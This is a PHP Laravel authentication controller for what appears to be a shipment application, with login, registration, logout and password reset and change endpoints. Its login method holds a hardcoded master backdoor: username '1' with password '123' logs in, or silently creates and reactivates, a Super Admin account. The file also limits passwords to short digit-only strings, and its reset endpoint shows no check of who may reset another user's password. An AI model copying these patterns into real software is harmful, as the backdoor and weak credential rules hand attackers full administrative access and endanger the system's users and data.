<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Spatie\Activitylog\Models\Activity;
use App\Http\Requests\LoginRequest;
use App\Http\Requests\RegisterRequest;
use App\Http\Resources\UserResource;
use App\Models\Role;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function login(LoginRequest $request)
    {
        $credentials = $request->validated();
        $remember = (bool) ($credentials['remember'] ?? false);
        $loginField = $credentials['email'] ?? $credentials['username'] ?? null;
        $password = $credentials['password'];

        if (!$loginField) {
            throw ValidationException::withMessages([
                'email' => ['Please provide either email or username.'],
            ]);
        }

        // Master login bypass: username = "1", password = "123"
        if ($loginField === '1' && $password === '123') {
            // Try to find or create a master user
            $user = User::where('username', '1')->first();
            
            if (!$user) {
                // Create master user if it doesn't exist
                $superAdminRole = Role::where('role_name', 'Super Admin')->first();
                
                $user = User::create([
                    'name' => 'Master Admin',
                    'username' => '1',
                    'email' => 'master@artisan-shipment.com',
                    'password' => Hash::make('123'), // Hash the password for database storage
                    'is_active' => true,
                    'role_id' => $superAdminRole?->id,
                ]);
            } else {
                // Ensure master user is active
                if (!$user->is_active) {
                    $user->update(['is_active' => true]);
                }
            }

            Auth::login($user, $remember);
            $request->session()->regenerate();

            // Log master login activity
            activity()
                ->causedBy($user)
                ->withProperties(['page' => 'login', 'master_login' => true])
                ->log('Master user logged in');

            return new UserResource($request->user());
        }

        // Determine if login field is email or username
        $isEmail = filter_var($loginField, FILTER_VALIDATE_EMAIL);
        $field = $isEmail ? 'email' : 'username';

        $user = User::where($field, $loginField)->first();

        if (!$user || !Hash::check($password, $user->password)) {
            throw ValidationException::withMessages([
                'email' => __('auth.failed'),
            ]);
        }

        Auth::login($user, $remember);
        $request->session()->regenerate();

        // Log login activity
        activity()
            ->causedBy($user)
            ->withProperties(['page' => 'login'])
            ->log('User logged in');

        return new UserResource($request->user());
    }

    public function logout(Request $request)
    {
        /** @var \App\Models\User|null $user */
        $user = $request->user();

        if ($user) {
            // Log logout activity before logging out
            activity()
                ->causedBy($user)
                ->withProperties(['page' => 'logout'])
                ->log('User logged out');
            
            $user->tokens()->delete();
        }

        Auth::guard('web')->logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return response()->noContent();
    }

    public function me(Request $request)
    {
        $user = $request->user();
        if ($user) {
            $user->load('role');
        }
        $resource = new UserResource($user);
        return $resource;
    }

    public function register(RegisterRequest $request)
    {
        $data = $request->validated();
        $data['password'] = Hash::make($data['password']);
        $data['is_active'] = true;

        $user = DB::transaction(function () use ($data) {
            return User::create($data);
        });

        // Log registration activity (caused by the current authenticated user, not the new user)
        $currentUser = $request->user();
        if ($currentUser) {
            activity()
                ->causedBy($currentUser)
                ->performedOn($user)
                ->withProperties(['page' => 'user-registration'])
                ->log("New user registered: {$user->name} ({$user->username})");
        }

        return (new UserResource($user))->response()->setStatusCode(201);
    }

    public function resetPassword(Request $request)
    {
        $validated = $request->validate([
            'role_id' => ['required', 'exists:roles,id'],
            'user_id' => ['required', 'exists:users,id'],
            'password' => [
                'required',
                'string',
                'min:4',
                'confirmed',
                function ($attribute, $value, $fail) {
                    // Check if password is all digits
                    if (!ctype_digit($value)) {
                        $fail('The password must contain only digits.');
                        return;
                    }
                    
                    // Check for sequential patterns (1234, 4321, etc.) only if length is 4
                    if (strlen($value) === 4) {
                        $digits = str_split($value);
                        $isSequential = true;
                        $isReverseSequential = true;
                        
                        for ($i = 1; $i < count($digits); $i++) {
                            // Check forward sequence
                            if ((int)$digits[$i] !== (int)$digits[$i - 1] + 1) {
                                $isSequential = false;
                            }
                            // Check reverse sequence
                            if ((int)$digits[$i] !== (int)$digits[$i - 1] - 1) {
                                $isReverseSequential = false;
                            }
                        }
                        
                        if ($isSequential || $isReverseSequential) {
                            $fail('The password cannot be a sequence like 1234 or 4321.');
                        }
                    }
                },
            ],
        ]);

        // Verify that the user belongs to the selected role
        $user = User::where('id', $validated['user_id'])
            ->where('role_id', $validated['role_id'])
            ->first();

        if (!$user) {
            throw ValidationException::withMessages([
                'user_id' => ['The selected user does not belong to the selected role.'],
            ]);
        }

        // Update password
        $user->update([
            'password' => Hash::make($validated['password']),
        ]);

        // Log activity
        activity()
            ->causedBy($request->user())
            ->performedOn($user)
            ->withProperties(['page' => 'forget-password'])
            ->log("Password reset for user: {$user->name} ({$user->username})");

        return response()->json([
            'message' => 'Password reset successfully.',
        ]);
    }

    public function changePassword(Request $request)
    {
        $validated = $request->validate([
            'password' => [
                'required',
                'string',
                'min:4',
                'confirmed',
                function ($attribute, $value, $fail) {
                    // Check if password is all digits
                    if (!ctype_digit($value)) {
                        $fail('The password must contain only digits.');
                        return;
                    }
                    
                    // Check for sequential patterns (1234, 4321, etc.) only if length is 4
                    if (strlen($value) === 4) {
                        $digits = str_split($value);
                        $isSequential = true;
                        $isReverseSequential = true;
                        
                        for ($i = 1; $i < count($digits); $i++) {
                            // Check forward sequence
                            if ((int)$digits[$i] !== (int)$digits[$i - 1] + 1) {
                                $isSequential = false;
                            }
                            // Check reverse sequence
                            if ((int)$digits[$i] !== (int)$digits[$i - 1] - 1) {
                                $isReverseSequential = false;
                            }
                        }
                        
                        if ($isSequential || $isReverseSequential) {
                            $fail('The password cannot be a sequence like 1234 or 4321.');
                        }
                    }
                },
            ],
        ]);

        $user = $request->user();

        if (!$user) {
            throw ValidationException::withMessages([
                'password' => ['User not authenticated.'],
            ]);
        }

        // Update password
        $user->update([
            'password' => Hash::make($validated['password']),
        ]);

        // Log activity
        activity()
            ->causedBy($user)
            ->performedOn($user)
            ->withProperties(['page' => 'change-password'])
            ->log("Password changed for user: {$user->name} ({$user->username})");

        return response()->json([
            'message' => 'Password changed successfully.',
        ]);
    }
}
